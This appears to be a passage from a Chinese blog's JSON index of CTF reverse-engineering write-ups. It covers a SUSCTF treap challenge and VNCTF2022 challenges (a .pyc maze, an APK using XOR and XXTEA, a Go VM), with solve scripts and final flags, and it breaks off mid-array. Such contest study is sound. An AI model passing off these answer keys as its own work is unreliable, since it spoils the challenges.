//假设把此节点当做根节点，整个Tree的叶子个数 0X10 DWORD 随机数; //优先级 0X14 DWORD 1; //这个没搞懂啥意思 0X18 DWORD input; //输入的flag的每一个字符&#125; 在00000001400073B0处存放着根节点，00000001400073B4, 00000001400073B8处存着当前树的所有叶子个数 输入SUSCTF&#123;01234567890122345679abcdefghijkl&#125;, 然后根据00000001400073C0处的数据画出自己输入的假的flag构造的二叉树 提取出00000001400073C0处有效的32个数组 123456789101112131415161718192021222324252627282930313200000000 00000013 000000F1 00000006 2109B018 00000001 000000300000000F 00000009 000000D9 00000018 11BB2E13 00000001 0000003100000000 00000000 000000F7 00000001 5D64CABB 00000001 0000003200000000 0000000B 0000009A 00000002 302F1C09 00000001 0000003300000004 00000015 000000AF 00000020 02E78C02 00000001 0000003400000000 00000000 000000B4 00000001 2A28B165 00000001 0000003500000000 00000000 000000BB 00000001 6F018185 00000001 0000003600000000 00000006 000000B1 00000002 1CF5A8D1 00000001 0000003700000016 00000011 000000EE 0000000E 1532F368 00000001 0000003800000000 00000000 000000F4 00000001 42367652 00000001 0000003900000000 00000000 000000A0 00000001 7B50B157 00000001 0000003000000007 00000000 000000C2 00000002 244FA941 00000001 0000003100000000 00000000 000000D7 00000001 48CB7CCC 00000001 000000320000000C 00000014 000000CF 00000004 1950F130 00000001 0000003200000008 00000012 000000B6 00000009 15561F1B 00000001 0000003300000000 0000000A 000000F3 00000002 29F35383 00000001 0000003400000001 00000020 00000101 0000000A 204017F9 00000001 000000350000000E 0000000D 000000D5 00000006 15686F99 00000001 0000003600000010 0000001A 000000F6 00000005 274AD200 00000001 0000003700000000 00000000 000000D3 00000001 650387E1 00000001 000000390000001B 00000019 00000130 0000001D 04C2B77D 00000001 0000006100000017 00000000 000000E7 00000003 278451D6 00000001 0000006200000000 00000018 000000DE 00000002 3F0318C0 00000001 0000006300000000 00000000 000000E3 00000001 78E83012 00000001 0000006400000000 0000001D 0000013D 00000002 0D00C42A 00000001 0000006500000003 00000000 000000FD 00000002 537C7E9D 00000001 0000006600000002 0000001E 0000012A 0000001A 0F8680AF 00000001 0000006700000000 00000000 00000103 00000001 72A27C9F 00000001 0000006800000000 00000000 0000014D 00000001 5C4909AF 00000001 0000006900000000 00000000 0000012C 00000001 2FE974B3 00000001 0000006A00000000 00000000 00000125 00000001 351BEA91 00000001 0000006B0000001C 0000001F 00000123 00000003 2ADAD13B 00000001 0000006C 一点点调试就会发现这采用了后序遍历的方式去遍历这个二叉树， 1234567......0000000140010DE3 | 48:6305 D265FFFF | movsxd rax,dword ptr ds:[0x1400073BC] | 0x00000001400073BC 是比对字符的个数，估计到了32的时候就是成功的位置000000014001C1ED | 48:8D0D 4C9EFEFF | lea rcx,qword ptr ds:[0x140006040] | 140006040存放着后续遍历的真正的数据，需要找到索引才能还原 ......0000000140014ED1 | 394424 2C | cmp dword ptr ss:[rsp+0x2C],eax | 最终比较 ...... 将140006040处的数据提取出来，构造二叉树 12encs = [0x00A2, 0x00AF, 0x009D, 0x00B7, 0x00D2, 0x00CB, 0x00C7, 0x00C6, 0x00B0, 0x00D5, 0x00DA, 0x00E3, 0x00E6, 0x00E8, 0x00E9, 0x00F3, 0x00F4, 0x00EF, 0x00EE, 0x00F7, 0x00F9, 0x00FF, 0x0101, 0x00F5, 0x0109, 0x011F, 0x011A, 0x0146, 0x0124, 0x010F, 0x0106, 0x00DF] flag—&gt;加密–&gt;按照顺序插入–&gt;得到了这个二叉树，因此咱们现在只需要知道现在这个二叉树每个节点的索引，然后解密就可以得到原始的flag 在调试的过程中发现，如果当前比较的这个节点不是叶子节点的话，会对本节点和左孩子节点 ，本节点和右孩子节点 的关系进行验证 12345# 比较的汇编代码在这000000014001B7B0 | 48:3914C1 | cmp qword ptr ds:[rcx+rax*8],rdx | 比较右孩子 ......0000000140015993 | 48:3914C1 | cmp qword ptr ds:[rcx+rax*8],rdx | 左孩子比较 ...... 这就是我们的突破口 00000001400060C0 存放着本节点和左孩子节点的关系 00000001400061C0 存放着本节点和右孩子之间的关系 这2个数据怎么用呢？调试发现是 孩子节点序号 *0X17 + 本节点input = 关系s[本节点序号] 因此我们要得到孩子节点序号的话，需要知道本节点的Input + 本节点的序号，然后用本节点序号去索引左孩子或右孩子关系s， 1234567def get_child_xuhao(node_c, gx): # node_c： 本节点字符 # gx: 关系 # 孩子节点序号 * 0x17 + 本节点input = gx if (gx - node_c) % 0x17 == 0: return int((gx - node_c) / 0x17) return None 因为Treap有堆的性质，根节点的优先级是最小的，因此我们提取出所有的优先级，对他进行排序 123456789101112c = [0x2109B018, 0x11BB2E13, 0x5D64CABB, 0x302F1C09, 0x02E78C02, 0x2A28B165, 0x6F018185, 0x1CF5A8D1, 0x1532F368, 0x42367652, 0x7B50B157, 0x244FA941, 0x48CB7CCC, 0x1950F130, 0x15561F1B, 0x29F35383, 0x204017F9, 0x15686F99, 0x274AD200, 0x650387E1, 0x04C2B77D, 0x278451D6, 0x3F0318C0, 0x78E83012, 0x0D00C42A, 0x537C7E9D, 0x0F8680AF, 0x72A27C9F, 0x5C4909AF, 0x2FE974B3, 0x351BEA91, 0x2ADAD13B]yxj = [[i, c[i]] for i in range(len(c))]def sort_(elem): return elem[1]yxj.sort(key=sort_)print(yxj)# [[4, 48729090], [20, 79869821], [24, 218154026], [26, 260473007], [1, 297479699], [8, 355660648], [14, 357965595], [17, 359165849], [13, 424735024], [7, 485861585], [16, 541071353], [0, 554283032], [11, 609200449], [18, 659214848], [21, 662983126], [15, 703812483], [5, 707309925], [31, 718983483], [29, 803828915], [3, 808393737], [30, 891021969], [22, 1057167552], [9, 1110865490], [12, 1221295308], [25, 1400667805], [28, 1548290479], [2, 1566886587], [19, 1694730209], [6, 1862369669], [27, 1923251359], [23, 2028482578], [10, 2068885847]] 可以发现，索引是4，即序号是5的时候最小，即223的序号是5，根据5(序号)和223(enc_input)进行解密就可以得到本节点字符 ‘d’ 1234567def get_real_c(_index, enc_input): # 通过索引和enc_input得到原始input tmp = enc_input - 97 - key[_index] - _index return tmpget_real_c(4, 223)# 100 --&gt;chr(100) = &#x27;d&#x27; 然后写脚本递归就可以得到所有节点的字符 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101# [本节点，左孩子，右孩子，序号，flag]# 构造二叉树treap = [ [223, 218, 262, 5, 100], [218, 213, 0, 0, 0], [213, 176, 0, 0, 0], [176, 157, 198, 0, 0], [157, 0, 175, 0, 0], [175, 162, 0, 0, 0], [198, 183, 199, 0, 0], [162, 0, 0, 0, 0], [183, 0, 0, 0, 0], [199, 0, 203, 0, 0], [203, 0, 210, 0, 0], [210, 0, 0, 0, 0], [262, 245, 271, 0, 0], [245, 238, 257, 0, 0], [238, 233, 239, 0, 0], [233, 232, 0, 0, 0], [232, 230, 0, 0, 0], [230, 227, 0, 0, 0], [227, 0, 0, 0, 0], [239, 0, 244, 0, 0], [244, 243, 0, 0, 0], [243, 0, 0, 0, 0], [257, 255, 0, 0, 0], [255, 249, 0, 0, 0], [249, 247, 0, 0, 0], [247, 0, 0, 0, 0], [271, 265, 292, 0, 0], [265, 0, 0, 0, 0], [292, 282, 326, 0, 0], [282, 0, 287, 0, 0], [326, 0, 0, 0, 0], [287, 0, 0, 0, 0]]treap_dict = &#123;&#125;for i in range(32): treap_dict[treap[i][0]] = treap[i][1:5]key = [0x60, 0x46, 0x62, 0x03, 0x16, 0x19, 0x1E, 0x12, 0x4D, 0x51, 0x05, 0x25, 0x38, 0x2F, 0x14, 0x4F, 0x5B, 0x2D, 0x4C, 0x26, 0x5A, 0x0F, 0x04, 0x07, 0x5F, 0x1D, 0x48, 0x1F, 0x67, 0x44, 0x3B, 0x37]encs = [0x00A2, 0x00AF, 0x009D, 0x00B7, 0x00D2, 0x00CB, 0x00C7, 0x00C6, 0x00B0, 0x00D5, 0x00DA, 0x00E3, 0x00E6, 0x00E8, 0x00E9, 0x00F3, 0x00F4, 0x00EF, 0x00EE, 0x00F7, 0x00F9, 0x00FF, 0x0101, 0x00F5, 0x0109, 0x011F, 0x011A, 0x0146, 0x0124, 0x010F, 0x0106, 0x00DF]# 节点和右孩子之间的关系gxs_right = [0x00AC, 0x00FD, 0x0247, 0x0115, 0x00D4, 0x02B5, 0x01FC, 0x028B, 0x014A, 0x004C, 0x008E, 0x00E9, 0x0055, 0x012C, 0x00F5, 0x00E3, 0x0081, 0x02E2, 0x01A8, 0x0117, 0x0152, 0x0101, 0x003A, 0x01D0, 0x00A8, 0x00CC, 0x0149, 0x0137, 0x0300, 0x01EC, 0x0276, 0x0247]# 节点和左孩子之间的关系gxs_left = [0x00A8, 0x0131, 0x0113, 0x0047, 0x009E, 0x003B, 0x003A, 0x00BF, 0x0092, 0x00F0, 0x0174, 0x00C3, 0x0289, 0x0104, 0x0260, 0x004D, 0x02FB, 0x009E, 0x0191, 0x0158, 0x007D, 0x004A, 0x01E9, 0x0101, 0x00D0, 0x00FC, 0x0070, 0x011F, 0x0345, 0x0162, 0x02A4, 0x0092]def get_child_xuhao(node_c, gx): # node_c： 本节点字符 # gx: 关系 # 孩子节点序号 * 0x17 + 本节点input = gx if (gx - node_c) % 0x17 == 0: return int((gx - node_c) / 0x17) return Nonedef get_real_c(_index, enc_input): # 通过索引和enc_input得到原始input tmp = enc_input - 97 - key[_index] - _index return tmpdef treap_traverse(_root): if _root == 0: return node_c = get_real_c(treap_dict[_root][2] - 1, _root) idx = encs.index(_root) # 得到后续遍历后的数组中_root的索引 # 如果左节点不为空，更新左节点的数据 left_root = treap_dict[_root][0] right_root = treap_dict[_root][1] if left_root != 0: left_xh = get_child_xuhao(node_c, gxs_left[idx]) left_c = get_real_c(left_xh - 1, treap_dict[_root][0]) # 左孩子 treap_dict[left_root][2] = left_xh treap_dict[left_root][3] = left_c treap_traverse(left_root) if right_root != 0: right_xh = get_child_xuhao(node_c, gxs_right[idx]) right_c = get_real_c(right_xh - 1, treap_dict[_root][1]) # 右孩子 treap_dict[right_root][2] = right_xh treap_dict[right_root][3] = right_c treap_traverse(right_root)treap_traverse(223)flag = []for _key, value in treap_dict.items(): flag.append([value[2], value[3]])flag.sort()flag = [x[1] for x in flag]print(&quot;SUSCTF&#123;&quot; + &quot;&quot;.join(map(chr, flag)) + &quot;&#125;&quot;)# SUSCTF&#123;8226d8a68d25d8f03be17c4d7027b29c&#125; flag为：SUSCTF{8226d8a68d25d8f03be17c4d7027b29c}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://zzzzsky.github.io/categories/CTF/"}],"tags":[{"name":"二叉树","slug":"二叉树","permalink":"https://zzzzsky.github.io/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"}]},{"title":"VNCTF2022_RE_复盘","slug":"VNCTF2022_RE_WP","date":"2022-02-23T09:03:00.000Z","updated":"2022-02-23T09:05:54.827Z","comments":true,"path":"2022/02/23/VNCTF2022_RE_WP/","link":"","permalink":"https://zzzzsky.github.io/2022/02/23/VNCTF2022_RE_WP/","excerpt":"","text":"VNCTF2022_RE_复盘1.BabyMaze题目给出一个 BabyMaze.pyc 文件，尝试用uncompyle6反编译，但是失败 ，于是用脚本反汇编 1234567891011121314151617181920212223242526# 安装环境import disimport marshalimport sysheader_sizes = [ # (size, first version this applies to) # pyc files were introduced in 0.9.2 way, way back in June 1991. (8, (0, 9, 2)), # 2 bytes magic number, \\r\\n, 4 bytes UNIX timestamp (12, (3, 6)), # added 4 bytes file size # bytes 4-8 are flags, meaning of 9-16 depends on what flags are set # bit 0 not set: 9-12 timestamp, 13-16 file size # bit 0 set: 9-16 file hash (SipHash-2-4, k0 = 4 bytes of the file, k1 = 0) (16, (3, 7)), # inserted 4 bytes bit flag field at 4-8 # future version may add more bytes still, at which point we can extend # this table. It is correct for Python versions up to 3.9]header_size = next(s for s, v in reversed( header_sizes) if sys.version_info &gt;= v)with open(&#x27;BabyMaze.pyc&#x27;, &quot;rb&quot;) as f: metadata = f.read(header_size) # first header_size bytes are metadata code = marshal.load(f) # rest is a marshalled code objecta = dis.dis(code)print(len(code.co_code)) 1234567891011121314151617181920212223242526272829303132331 0 JUMP_ABSOLUTE 4 &gt;&gt; 2 JUMP_ABSOLUTE 6 &gt;&gt; 4 JUMP_ABSOLUTE 2 &gt;&gt; 6 LOAD_CONST 0 (1) 8 LOAD_CONST 0 (1) 10 LOAD_CONST 0 (1) 12 LOAD_CONST 0 (1) 14 LOAD_CONST 0 (1) 16 LOAD_CONST 0 (1) 18 LOAD_CONST 0 (1) 20 LOAD_CONST 0 (1) 22 LOAD_CONST 0 (1) 24 LOAD_CONST 0 (1) 26 LOAD_CONST 0 (1) 28 LOAD_CONST 0 (1) 30 LOAD_CONST 0 (1) 32 LOAD_CONST 0 (1) 34 LOAD_CONST 0 (1) 36 LOAD_CONST 0 (1) 38 LOAD_CONST 0 (1) 40 LOAD_CONST 0 (1) 42 LOAD_CONST 0 (1) 44 LOAD_CONST 0 (1) 46 LOAD_CONST 0 (1) 48 LOAD_CONST 0 (1) 50 LOAD_CONST 0 (1) .......... 42 LOAD_CONST 5 (&quot;Sorry, we won&#x27;t acknowledge the existence of your squad.&quot;) 44 CALL_FUNCTION 1 46 POP_TOP &gt;&gt; 48 LOAD_CONST 0 (None) 50 RETURN_VALUE 2030(0X7EE) 可以发现开头是3个指令的跳转，是这个地方干扰了uncompyle6，于是打开opcode.h，找对应的机器码 是113（0X71) 将其删除，并且将 7EE 改为 7E8,然后重新反编译 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# uncompyle6 version 3.7.4# Python bytecode 3.8 (3413)# Decompiled from: Python 3.8.5 (tags/v3.8.5:580fbb0, Jul 20 2020, 15:57:54) [MSC v.1924 64 bit (AMD64)]# Embedded file name: .\\BabyMaze.py# Compiled at: 2022-02-08 15:12:27# Size of source mod 2**32: 3707 bytes_map = [ [ 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1], [1, 5, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1], [1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1], [1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1], [1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1], [1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1], [1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1], [1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1], [1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1], [1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1], [1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1], [1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1], [1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1], [1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1], [1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1], [1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1], [1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1], [1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1], [1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1], [1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1], [1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1], [1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1], [1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1], [1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1], [1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1], [1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1], [1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1], [1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1], [1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1], [1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 7, 1], [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]]def maze(): x = 1 y = 1 step = input() for i in range(len(step)): if step[i] == &#x27;w&#x27;: x -= 1 else: if step[i] == &#x27;s&#x27;: x += 1 else: if step[i] == &#x27;a&#x27;: y -= 1 else: if step[i] == &#x27;d&#x27;: y += 1 else: return False if _map[x][y] == 1: return False if x == 29 and y == 29: return Truedef main(): print(&#x27;Welcome To VNCTF2022!!!&#x27;) print(&#x27;Hello Mr. X, this time your mission is to get out of this maze this time.(FIND THAT 7!)&#x27;) print(&#x27;you are still doing the mission alone, this tape will self-destruct in five seconds.&#x27;) if maze(): print(&#x27;Congratulation! flag: VNCTF&#123;md5(your input)&#125;&#x27;) else: print(&quot;Sorry, we won&#x27;t acknowledge the existence of your squad.&quot;)if __name__ == &#x27;__main__&#x27;: main()# okay decompiling BabyMaze.pyc 发现是31 * 31的迷宫 稍作整理，DFS解密即可, 解密脚本如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141# 题目：给定大小为n*m的矩阵，求S到G的最短路径并输出# 输入：# 10 10# #S######.## ......#..## .#.##.##.## .#........# ##.##.##### ....#....## .#######.## ....#.....# .####.###.# ....#...G## 输出：# 迷宫路径import queueimport hashlibMAX_VALUE = float(&#x27;inf&#x27;)class Point: def __init__(self, x=0, y=0): self.x = x self.y = ydef bfs(maze, begin, end): path = [] # 保存经过的每一个点 n, m = len(maze), len(maze[0]) dist = [[MAX_VALUE for _ in range(m)] for _ in range(n)] pre = [[None for _ in range(m)] for _ in range(n)] # 当前点的上一个点,用于输出路径轨迹 nx = [[1, 0], [-1, 0], [0, -1], [0, 1]] sx, sy = begin.x, begin.y gx, gy = end.x, end.y dist[sx][sy] = 0 q = queue.Queue() q.put(begin) while q: point = q.get() if point.x == gx and point.y == gy: break for i in range(4): dx, dy = point.x + nx[i][0], point.y + nx[i][1] if 0 &lt;= dx &lt; n and 0 &lt;= dy &lt; m and maze[dx][dy] != &#x27;#&#x27; and dist[dx][dy] == MAX_VALUE: dist[dx][dy] = dist[point.x][point.y] + 1 pre[dx][dy] = point q.put(Point(dx, dy)) stack = [] curr = end while True: stack.append(curr) if curr.x == begin.x and curr.y == begin.y: break prev = pre[curr.x][curr.y] curr = prev while stack: curr = stack.pop() # print(&#x27;(%d, %d)&#x27; % (curr.x, curr.y)) path.append((curr.x, curr.y)) return pathdef get_path(path): # 将路径的点打印为路径 sss = &quot;&quot; for i in range(1, len(path)): x = path[i-1] # 前面的 y = path[i] # 后面的 if x[0] == y[0]: # 横坐标相同，左右移动，即a或d if x[1] &gt; y[1]: sss += &quot;a&quot; else: sss += &quot;d&quot; else: # 纵坐标相同 if x[0] &gt; y[0]: sss += &quot;w&quot; else: sss += &quot;s&quot; # print(sss) return sssif __name__ == &#x27;__main__&#x27;: n, m = map(int, input().split()) maze = [[&#x27;&#x27; for _ in range(m)] for _ in range(n)] begin = Point() end = Point() for i in range(n): s = input() maze[i] = list(s) if &#x27;S&#x27; in s: begin.x = i begin.y = s.index(&#x27;S&#x27;) if &#x27;G&#x27; in s: end.x = i end.y = s.index(&#x27;G&#x27;) _path = bfs(maze, begin, end) path = get_path(_path) print(path) print(hashlib.md5(path.encode()).hexdigest())# 31 31# ################################ #S#.................#.........## #.#.#########.#####.#.#######.## #.#...#.......#...#...#.#...#.## #.#####.#########.#####.#.#.#.## #...#...#.............#...#...## ###.#.###.#############.######## #...#.#...#.........#...#...#.## #.###.#.###.#######.#.###.#.#.## #.....#.#...#...#.#.#...#.#...## #######.#.###.#.#.#.###.#.###.## #.......#.....#...#.#...#.#...## #.###############.#.#.###.#.#### #.......#.......#.#...#...#...## #.#####.#.#.#.###.#####.######## #.#...#.#.#.#.#...#...........## #.#.#.#.#.#.###.###.#####.###.## #.#.#.#.#.#...#...#.#...#.#...## #.#.###.#.###.###.#.#.#.###.#### #...#...#.#.....#.#.#.#...#...## #.###.#.#.#.#####.#.#.###.#.#.## #.#...#.#.#.......#.#.#.#.#.#.## #.#.###.#.###########.#.#.#.#.## #.#...#.#.#.........#.#.#.#.#.## #.###.#.#.#####.#.#.#.#.#.#.#.## #...#.#.#.....#.#.#...#...#.#.## #####.#######.###.#######.###.## #.....#.....#...#.......#.....## #.#####.###.###.#######.#####.## #.........#.............#....G## ################################ ssssddssaassddddwwwwddwwddddddwwddddddssddwwddddddddssssaawwaassaassaassddssaassaawwwwwwaaaaaaaassaassddddwwddssddssssaassddssssaaaaaawwddwwaawwwwaassssssssssssddddssddssddddddddwwaaaaaawwwwddssddwwwwwwwwddssddssssssssddddss# 801f190737434100e7d2790bd5b0732e 关于python字节码的反汇编，可以看这个文章学习 https://song-10.gitee.io/2020/04/20/Reverse-2020-04-20-python-byte/ 2.cm1是个APK文件，拖入JEB进行分析 发现关键check函数放在了解密后的ooo文件中，进入copyFiles函数观察如何解密的 是以1024为1组，异或vn2022，写脚本解密 1234567with open(&quot;ooo&quot;, &quot;rb&quot;) as f: content = list(f.read())key = b&quot;vn2022&quot;for i in range(len(content)): content[i] ^= key[(i % 1024) % 6]with open(&quot;oooo&quot;, &quot;wb&quot;) as f: f.write(bytes(content)) 然后用jadx打开opoo，找到hcheck 是xxtea加密，写脚本解密即可 123In [18]: a = b&quot;H4pPY_VNCTF!!OvO&quot;In [19]: struct.unpack(&quot;&lt;IIII&quot;, a)Out[19]: (1349530696, 1314283353, 558257219, 1333153569) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;stdio.h&gt;void encrypt(unsigned int * v, int n, unsigned int * key) &#123; unsigned int rounds = (52 / n) + 6; unsigned int sum = 0, y = 0; unsigned int z = v[n - 1]; unsigned int p; while (rounds &gt; 0) &#123; sum -= 1640531527; unsigned int e = (sum &gt;&gt; 2) &amp; 3; for (p = 0; p &lt; n - 1; p++) &#123; y = v[p + 1]; v[p] += ((((z &gt;&gt; 5) ^ (y &lt;&lt; 2)) + ((y &gt;&gt; 3) ^ (z &lt;&lt; 4))) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z))); z = v[p]; &#125; y = v[0]; v[n - 1] += ((((z &gt;&gt; 5) ^ (y &lt;&lt; 2)) + ((y &gt;&gt; 3) ^ (z &lt;&lt; 4))) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z))); z = v[n - 1]; rounds--; &#125;&#125;void decrypt(unsigned int* v, int n, unsigned int* key)&#123; unsigned int rounds = (52 / n) + 6; unsigned int sum =0 - (1640531527 * rounds), z = 0; unsigned int p; unsigned int y = v[0]; while (rounds &gt; 0) &#123; unsigned int e = (sum &gt;&gt; 2) &amp; 3; for (p = n - 1; p &gt; 0; p--) &#123; z = v[p - 1]; v[p] -= ((((z &gt;&gt; 5) ^ (y &lt;&lt; 2)) + ((y &gt;&gt; 3) ^ (z &lt;&lt; 4))) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z))); y = v[p]; &#125; z = v[n - 1]; v[0] -= ((((z &gt;&gt; 5) ^ (y &lt;&lt; 2)) + ((y &gt;&gt; 3) ^ (z &lt;&lt; 4))) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z))); y = v[0]; sum += 1640531527; rounds--; &#125;&#125;int main() &#123; char c[] = &#123; 68, 39, -92, 108, -82, -18, 72, -55, 74, -56, 38, 11, 60, 84, 97, -40, 87, 71, 99, -82, 120, 104, 47, -71, -58, -57, 0, 33, 42, 38, -44, -39, -60, 113, -2, 92, -75, 118, -77, 50, -121, 43, 32, -106 &#125;; unsigned int key[] = &#123; 1349530696, 1314283353, 558257219, 1333153569 &#125;; decrypt((unsigned int *)c, 11, key); return 0;&#125;//VNCTF&#123;93ee7688-f216-42cb-a5c2-191ff4e412ba&#125; 3.cm狗拿到题目，发现是用go语言实现的VM，直接用IDA7.6打开 根据main.(_ptr_MzVm).init 和 main.(_ptr_MzVm).run 2个函数，找到VM的大体结构 123456789101112131415161718192021struct func&#123; void *call; vm *vmm;&#125;struct vm&#123; DWORD REG[21]; DWORD stack[1000]; DWORD _eip; DWORD _esp; DWORD _ebp; QWORD * data; //指向OPCODE func * function[100]; char is_exit;&#125;;struct params&#123; DWORD parm1; DWORD parm2;&#125; 添加结构体到IDA中，发现瞬间函数变的非常的清晰 慢慢分析每个func的功能，然后把OPCODE提取出来，写脚本打印伪代码 123456789101112131415161718192021222324252627282930313233a = [0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000057, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000065, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000006C, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000063, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000006F, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000006D, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000065, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000020, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000074, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000006F, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000020, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000056, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000004E, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000043, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000054, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000046, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000032, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000030, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000032, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 